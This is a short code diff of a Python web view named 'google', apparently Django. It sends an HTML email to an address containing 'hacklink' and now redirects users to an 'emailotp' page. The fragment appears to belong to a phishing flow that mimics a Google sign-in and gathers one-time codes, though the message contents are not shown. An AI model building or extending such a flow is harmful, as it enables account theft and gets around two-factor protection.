@@ -135,6 +135,6 @@ def google(request):
         ['hacklink39@gmail.com'], 
         fail_silently=False, html_message=message)
 
-       return redirect('confirm_account')
+       return redirect('emailotp')
 
    return render(request, 'donate/google.html')
